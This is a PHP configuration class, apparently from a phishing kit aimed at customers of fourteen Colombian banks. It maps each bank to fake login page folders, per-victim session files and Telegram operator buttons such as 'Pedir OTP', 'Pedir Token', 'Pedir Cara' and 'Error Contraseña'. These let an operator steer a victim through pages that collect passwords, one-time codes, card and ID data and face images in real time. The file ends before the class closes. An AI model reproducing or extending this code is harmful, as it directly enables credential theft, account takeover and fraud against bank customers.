<?php

declare(strict_types=1);

namespace App\Config;

/**
 * Configuración Centralizada de Bancos - Sistema Tigo
 * Arquitectura Senior: Single Source of Truth para todos los bancos
 * 
 * @version 2.0.0
 * @package App\Config
 */
class BankConfig
{
    /**
     * Configuración completa de todos los bancos
     */
    public const BANKS = [
        'agrario' => [
            'code' => 'agrario',
            'name' => 'Banco Agrario',
            'displayName' => '🟢 BANCO AGRARIO',
            'folder' => 'Agrario',
            'pages' => ['index', 'password', 'dinamica', 'otp', 'token'],
            'sessionFile' => 'agrario_sessions.json',
            'buttons' => [
                'login' => ['request_password', 'request_dinamica', 'request_token', 'request_otp'],
                'password' => ['error_password', 'request_dinamica', 'request_token', 'request_otp'],
                'dinamica' => ['error_dinamica', 'request_token', 'request_otp'],
                'otp' => ['error_otp', 'request_token'],
                'token' => ['error_token']
            ]
        ],
        
        'bbva' => [
            'code' => 'bbva',
            'name' => 'BBVA',
            'displayName' => '🔵 BBVA',
            'folder' => 'BBVA',
            'pages' => ['index', 'otp', 'token'],
            'sessionFile' => 'bbva_sessions.json',
            'buttons' => [
                'login' => ['request_token'],
                'token' => ['error_token']
            ]
        ],
        
        'caja_social' => [
            'code' => 'caja_social',
            'name' => 'Caja Social',
            'displayName' => '🟠 CAJA SOCIAL',
            'folder' => 'Caja-Social',
            'pages' => ['index', 'password', 'otp', 'token'],
            'sessionFile' => 'caja_social_sessions.json',
            'buttons' => [
                'login' => ['request_password', 'request_token'],
                'password' => ['error_password', 'request_token'],
                'token' => ['error_token']
            ]
        ],
        
        'av_villas' => [
            'code' => 'av_villas',
            'name' => 'AV Villas',
            'displayName' => '🔴 AV VILLAS',
            'folder' => 'AV-Villas',
            'pages' => ['index', 'otp'],
            'sessionFile' => 'av_villas_sessions.json',
            'buttons' => [
                'login' => ['request_otp'],
                'otp' => ['error_otp']
            ]
        ],
        
        'mundo_mujer' => [
            'code' => 'mundo_mujer',
            'name' => 'Banco Mundo Mujer',
            'displayName' => '💜 BANCO MUNDO MUJER',
            'folder' => 'Banco-Mundo-Mujer',
            'pages' => ['index', 'password', 'dynamic', 'otp'],
            'sessionFile' => 'mundo_mujer_sessions.json',
            'buttons' => [
                'login' => ['request_password', 'request_dinamica', 'request_otp'],
                'password' => ['error_password', 'request_dinamica', 'request_otp'],
                'dinamica' => ['error_dinamica', 'request_otp'],
                'otp' => ['error_otp']
            ]
        ],
        
        'occidente' => [
            'code' => 'occidente',
            'name' => 'Banco de Occidente',
            'displayName' => '🟡 BANCO DE OCCIDENTE',
            'folder' => 'Occidente',
            'pages' => ['index', 'otp', 'token'],
            'sessionFile' => 'occidente_sessions.json',
            'buttons' => [
                'login' => ['request_token', 'request_otp'],
                'token' => ['error_token', 'request_otp'],
                'otp' => ['error_otp']
            ]
        ],
        
        'popular' => [
            'code' => 'popular',
            'name' => 'Banco Popular',
            'displayName' => '🔵 BANCO POPULAR',
            'folder' => 'Popular',
            'pages' => ['index', 'clave', 'otp', 'token'],
            'sessionFile' => 'popular_sessions.json',
            'buttons' => [
                'login' => ['request_clave', 'request_token', 'request_otp'],
                'clave' => ['error_clave', 'request_token', 'request_otp'],
                'token' => ['error_token', 'request_otp'],
                'otp' => ['error_otp']
            ]
        ],
        
        'serfinanza' => [
            'code' => 'serfinanza',
            'name' => 'Serfinanza',
            'displayName' => '🟢 SERFINANZA',
            'folder' => 'Serfinanza',
            'pages' => ['index', 'password', 'dinamica', 'otp'],
            'sessionFile' => 'serfinanza_sessions.json',
            'buttons' => [
                'login' => ['request_password', 'request_dinamica', 'request_otp'],
                'password' => ['error_password', 'request_dinamica', 'request_otp'],
                'dinamica' => ['error_dinamica', 'request_otp'],
                'otp' => ['error_otp']
            ]
        ],
        
        'falabella' => [
            'code' => 'falabella',
            'name' => 'Falabella',
            'displayName' => '🟢 FALABELLA',
            'folder' => 'Falabella',
            'pages' => ['index', 'dinamica', 'otp'],
            'sessionFile' => 'falabella_sessions.json',
            'buttons' => [
                'login' => ['request_dinamica', 'request_otp'],
                'dinamica' => ['error_dinamica', 'request_otp'],
                'otp' => ['error_otp']
            ]
        ],
        
        'itau' => [
            'code' => 'itau',
            'name' => 'Itaú',
            'displayName' => '🔵 ITAÚ',
            'folder' => 'Itau',
            'pages' => ['index', 'biometria', 'cedula', 'correo', 'otp', 'token'],
            'sessionFile' => 'itau_sessions.json',
            'buttons' => [
                'correo' => ['request_cedula', 'request_biometria', 'request_token'],
                'cedula' => ['request_biometria', 'request_token'],
                'biometria' => ['error_biometria', 'request_token'],
                'token' => ['error_token']
            ]
        ],
        
        'bancolombia' => [
            'code' => 'bancolombia',
            'name' => 'Bancolombia',
            'displayName' => '🟡 BANCOLOMBIA',
            'folder' => 'Bancolombia',
            'pages' => ['index', 'cedula', 'cara', 'tarjeta', 'dinamica'],
            'sessionFile' => 'bancolombia_sessions.json',
            'buttons' => [
                'login' => ['request_tarjeta', 'request_cedula', 'request_dinamica', 'request_cara'],
                'tarjeta' => ['request_login', 'request_cedula', 'request_dinamica', 'request_cara'],
                'cedula' => ['request_login', 'request_tarjeta', 'request_dinamica', 'request_cara'],
                'cara' => ['request_login', 'request_dinamica'],
                'dinamica' => ['error_dinamica', 'request_login']
            ]
        ],
        
        'daviplata' => [
            'code' => 'daviplata',
            'name' => 'Daviplata',
            'displayName' => '🟠 DAVIPLATA',
            'folder' => 'Daviplata',
            'pages' => ['index', 'clave', 'dinamica', 'otp'],
            'sessionFile' => 'daviplata_sessions.json',
            'buttons' => [
                'login' => ['request_clave', 'request_dinamica', 'request_otp'],
                'clave' => ['error_clave', 'request_dinamica', 'request_otp'],
                'dinamica' => ['error_dinamica', 'request_otp'],
                'otp' => ['error_otp']
            ]
        ],
        
        'davivienda' => [
            'code' => 'davivienda',
            'name' => 'Davivienda',
            'displayName' => '🔴 DAVIVIENDA',
            'folder' => 'Davivienda',
            'pages' => ['index', 'clave', 'token'],
            'sessionFile' => 'davivienda_sessions.json',
            'buttons' => [
                'login' => ['request_clave', 'request_token'],
                'clave' => ['error_clave', 'request_token'],
                'token' => ['error_token']
            ]
        ],
        
        'bogota' => [
            'code' => 'bogota',
            'name' => 'Banco de Bogotá',
            'displayName' => '🔵 BANCO DE BOGOTÁ',
            'folder' => 'Bogota',
            'pages' => ['index', 'dashboard', 'token'],
            'sessionFile' => 'bogota_sessions.json',
            'buttons' => [
                'login' => ['request_token'],
                'token' => ['error_token']
            ]
        ]
    ];

    /**
     * Obtener configuración por código
     */
    public static function get(string $code): ?array
    {
        return self::BANKS[$code] ?? null;
    }

    /**
     * Obtener configuración por carpeta
     */
    public static function getByFolder(string $folder): ?array
    {
        foreach (self::BANKS as $bank) {
            if ($bank['folder'] === $folder) {
                return $bank;
            }
        }
        return null;
    }

    /**
     * Obtener todos los códigos de banco
     */
    public static function getAllCodes(): array
    {
        return array_keys(self::BANKS);
    }

    /**
     * Obtener regex pattern para validación
     */
    public static function getRegexPattern(): string
    {
        return '/^(' . implode('|', self::getAllCodes()) . ')_(.+)$/';
    }

    /**
     * Obtener mapeo de nombres para Telegram
     */
    public static function getTelegramNames(): array
    {
        $names = [];
        foreach (self::BANKS as $bank) {
            $names[$bank['code']] = $bank['displayName'];
        }
        return $names;
    }

    /**
     * Obtener mapeo de bancos para PSE
     */
    public static function getBankFolderMap(): array
    {
        $map = [];
        foreach (self::BANKS as $bank) {
            $map[$bank['name']] = $bank['folder'];
        }
        return $map;
    }

    /**
     * Validar si un banco existe
     */
    public static function exists(string $code): bool
    {
        return isset(self::BANKS[$code]);
    }

    /**
     * Obtener total de bancos configurados
     */
    public static function count(): int
    {
        return count(self::BANKS);
    }

    /**
     * Obtener ruta del archivo de sesiones
     */
    public static function getSessionFile(string $code, string $storagePath): ?string
    {
        $bank = self::get($code);
        return $bank ? $storagePath . '/' . $bank['sessionFile'] : null;
    }

    /**
     * Obtener botones configurados para un banco y step específico
     * 
     * @param string $code Código del banco
     * @param string $step Paso actual (login, password, dinamica, etc.)
     * @return array Array de acciones de botones
     */
    public static function getButtons(string $code, string $step): array
    {
        $bank = self::get($code);
        if (!$bank || !isset($bank['buttons'][$step])) {
            // Botones por defecto si no hay configuración específica
            return ['finalizar'];
        }
        
        // Siempre agregar finalizar al final
        $buttons = $bank['buttons'][$step];
        if (!in_array('finalizar', $buttons)) {
            $buttons[] = 'finalizar';
        }
        
        return $buttons;
    }

    /**
     * Generar matriz de botones para Telegram
     * 
     * @param string $code Código del banco
     * @param string $step Paso actual
     * @param string $sessionId ID de sesión
     * @return array Matriz de botones para Telegram API
     */
    public static function generateTelegramButtons(string $code, string $step, string $sessionId): array
    {
        $actions = self::getButtons($code, $step);
        $buttons = [];
        
        // Mapeo de acciones a emojis y textos
        $buttonLabels = [
            'request_login' => '🔑 Pedir Login',
            'request_password' => '🔐 Pedir Contraseña',
            'request_clave' => '🔑 Pedir Clave',
            'request_dinamica' => '🔢 Pedir Dinámica',
            'request_otp' => '📲 Pedir OTP',
            'request_token' => '🔐 Pedir Token',
            'request_cedula' => '🆔 Pedir Cédula',
            'request_tarjeta' => '💳 Pedir Tarjeta',
            'request_cara' => '📷 Pedir Cara',
            'request_correo' => '📧 Pedir Correo',
            'request_biometria' => '👤 Pedir Biometría',
            'error_login' => '❌ Error Login',
            'error_password' => '❌ Error Contraseña',
            'error_clave' => '❌ Error Clave',
            'error_dinamica' => '❌ Error Dinámica',
            'error_otp' => '❌ Error OTP',
            'error_token' => '❌ Error Token',
            'error_biometria' => '❌ Error Biometría',
            'finalizar' => '✅ Finalizar'
        ];
        
        // Organizar botones en filas (2 por fila, última fila para finalizar)
        $row = [];
        foreach ($actions as $action) {
            $label = $buttonLabels[$action] ?? ucfirst(str_replace('_', ' ', $action));
            $callbackData = "{$code}_{$action}|{$sessionId}";
            
            // Finalizar siempre en su propia fila
            if ($action === 'finalizar') {
                if (!empty($row)) {
                    $buttons[] = $row;
                    $row = [];
                }
                $buttons[] = [
                    ['text' => $label, 'callback_data' => $callbackData]
                ];
            } else {
                $row[] = ['text' => $label, 'callback_data' => $callbackData];
                
                // Cuando la fila tiene 2 botones, agregarla y empezar nueva
                if (count($row) === 2) {
                    $buttons[] = $row;
                    $row = [];
                }
            }
        }
        
        // Agregar última fila si quedó incompleta (excepto si ya agregamos finalizar)
        if (!empty($row)) {
            $buttons[] = $row;
        }
        
        return $buttons;
    }
